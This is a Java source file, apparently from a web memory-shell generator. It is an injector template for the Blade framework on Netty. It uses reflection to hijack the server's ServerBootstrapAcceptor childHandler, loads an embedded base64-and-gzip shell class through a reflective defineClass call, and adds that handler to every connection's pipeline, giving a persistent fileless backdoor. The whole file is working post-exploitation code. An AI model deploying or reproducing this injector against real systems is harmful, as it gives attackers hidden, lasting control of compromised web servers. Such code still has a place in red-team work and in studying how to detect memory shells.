package com.reajason.javaweb.blade.injector;

import com.hellokaton.blade.mvc.WebContext;
import io.netty.channel.Channel;
import io.netty.channel.ChannelHandler;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.ChannelPipeline;
import io.netty.channel.socket.SocketChannel;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.UUID;
import java.util.zip.GZIPInputStream;

/**
 * Injection template for Blade. It links against the WebContext stub compiled into the plugin;
 * at runtime the target application class loader supplies the real Blade class.
 */
public class BladeNettyHandlerInjector extends ChannelInitializer<SocketChannel> {

    private static boolean injected;
    private static Class<?> shellClass;
    private static ChannelHandler originalChildHandler;

    static {
        // InjectorGenerator replaces this block with the self-constructor call when staticInitialize is enabled.
    }

    private final String handlerName = UUID.randomUUID().toString();

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }

    public BladeNettyHandlerInjector() {
        if (injected) {
            return;
        }
        injected = true;
        try {
            inject();
        } catch (Throwable e) {
            System.out.println("[-] Blade memshell injection failed: " + getErrorMessage(e));
        }
    }

    private void inject() throws Exception {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = getClass().getClassLoader();
        }
        WebContext webContext = WebContext.get();
        if (webContext == null) {
            System.out.println("[-] Blade memshell injection failed: WebContext is null, run the entrypoint on a Blade request thread");
            return;
        }
        shellClass = resolveShellClass(classLoader);

        ChannelHandlerContext handlerContext = webContext.getChannelHandlerContext();
        if (handlerContext == null) {
            System.out.println("[-] Blade memshell injection failed: channel handler context is unavailable");
            return;
        }
        Channel child = handlerContext.channel();
        Channel server = child.parent();
        if (server == null) {
            System.out.println("[-] Blade memshell injection failed: server channel not found");
            return;
        }

        ChannelPipeline serverPipeline = server.pipeline();
        Object acceptor = null;
        for (String name : serverPipeline.names()) {
            ChannelHandler handler = serverPipeline.get(name);
            if (handler != null && handler.getClass().getName().contains("ServerBootstrapAcceptor")) {
                acceptor = handler;
                break;
            }
        }
        if (acceptor == null) {
            System.out.println("[-] Blade memshell injection failed: ServerBootstrapAcceptor not found");
            return;
        }

        Field childHandlerField = getField(acceptor.getClass(), "childHandler");
        if (childHandlerField == null) {
            System.out.println("[-] Blade memshell injection failed: childHandler field not found");
            return;
        }
        ChannelHandler current = (ChannelHandler) childHandlerField.get(acceptor);
        originalChildHandler = current != null ? current : originalChildHandler;
        if (current == null || !current.getClass().getName().equals(getClass().getName())) {
            childHandlerField.set(acceptor, this);
        }

        addShellHandler(child.pipeline());
        System.out.println("[+] Blade memshell injected");
    }

    private Class<?> resolveShellClass(ClassLoader classLoader) throws Exception {
        try {
            return Class.forName(getClassName(), false, classLoader);
        } catch (ClassNotFoundException e) {
            byte[] classBytes = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            return (Class<?>) defineClass.invoke(classLoader, classBytes, 0, classBytes.length);
        }
    }

    private void addShellHandler(ChannelPipeline pipeline) throws Exception {
        if (pipeline.get(handlerName) != null) {
            return;
        }
        ChannelHandler shellHandler = (ChannelHandler) shellClass.newInstance();
        String anchor = null;
        for (String name : pipeline.names()) {
            if (name.contains("HttpObjectAggregator")) {
                anchor = name;
                break;
            }
        }
        if (anchor != null) {
            pipeline.addAfter(anchor, handlerName, shellHandler);
        } else {
            pipeline.addLast(handlerName, shellHandler);
        }
    }

    @Override
    protected void initChannel(SocketChannel channel) throws Exception {
        ChannelPipeline pipeline = channel.pipeline();
        if (pipeline.get(handlerName) != null) {
            return;
        }
        if (originalChildHandler != null) {
            pipeline.addLast(originalChildHandler);
        }
        addShellHandler(pipeline);
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
        } finally {
            if (gzipInputStream != null) {
                try {
                    gzipInputStream.close();
                } catch (IOException ignored) {
                }
            }
            out.close();
        }
        return out.toByteArray();
    }

    public Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null) {
                field = getField(clazz.getSuperclass(), fieldName);
            }
        }
        return field;
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
